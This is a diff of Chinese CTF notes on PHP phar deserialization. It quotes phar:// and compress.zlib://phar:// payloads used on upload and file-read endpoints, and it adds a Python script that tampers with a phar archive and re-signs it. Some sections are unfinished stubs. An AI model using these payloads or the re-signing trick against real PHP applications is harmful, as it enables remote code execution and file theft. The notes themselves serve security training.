@@ -1,5 +1,7 @@
 ## phar反序列化漏洞
 
+### 基础知识
+
 ```php
 <?php
     class Demo{}
@@ -98,9 +100,9 @@ php://filter/read=convert.base64-encode/resource=phar://phar.phar/test.txt
 ?>
 ```
 
----
+### phar反序列化例题
 
-例题:[https://github.com/CTFTraining/swpuctf_2018_simplephp](https://github.com/CTFTraining/swpuctf_2018_simplephp)
+[https://github.com/CTFTraining/swpuctf_2018_simplephp](https://github.com/CTFTraining/swpuctf_2018_simplephp)
 
 首先注意到URL`file.php?file=`可能存在任意文件读取
 
@@ -431,7 +433,7 @@ payload`file.php?file=phar://upload/337def6af3af5b39784016d8a5e06f8c.jpg`
 
 ---
 
-例题 2019年新生赛 image-checker
+2019年新生赛 image-checker
 
 从`class.php`可以得知存在`curl_exec`,可以使用`file://`协议来进行文件读取
 
@@ -465,3 +467,57 @@ $phar->stopBuffering();
 将phar文件修改为jpeg文件,上传即可
 
 在check image size中传入`compress.zlib://phar://uploads/487dfa0355.jpeg/test.jpeg`即可
+
+### phar包签名篡改
+
+假设需要对生成的phar包中的内容进行篡改,由于phar包存在签名校验机制,因此除了对内容进行篡改外,还需要对phar包进行重新签名
+
+[对phar签名的介绍](https://www.php.net/manual/zh/phar.fileformat.signature.php)
+
+签名由三部分组成
+
+1. 实际签名
+
+2. 签名方式 
+
+`0x0001`为`md5`,`0x0002`为`sha1`
+
+3. `GBMB`标记
+
+
+>todo
+
+![img]()
+
+```python
+def resign(source="source.phar",target="target.phar"):
+    phar=None
+    with open(source,"rb") as f:
+        phar=f.read()
+    phar=phar.replace(b'i:1;O:4:"fake":0:{}',b'i:0;O:4:"fake":0:{}') #篡改phar包中的内容
+    source=phar[:-28] #需要进行签名的数据
+    GBMB=phar[-8:] #签名标志(通常都是sha1??)和GBMB标签
+    signature=hashlib.sha1(source).digest() #sha1签名
+    phar=source+signature+GBMB
+    with open(target,"wb") as f:
+        f.write(phar)
+```
+
+
+
+
+
+
+
+
+
+### 将phar文件打包绕过黑名单限制
+
+
+
+
+>todo
+
+
+
+phar文件再进过压缩、打包等处理后都是依然可以使用phar://协议正常读取了
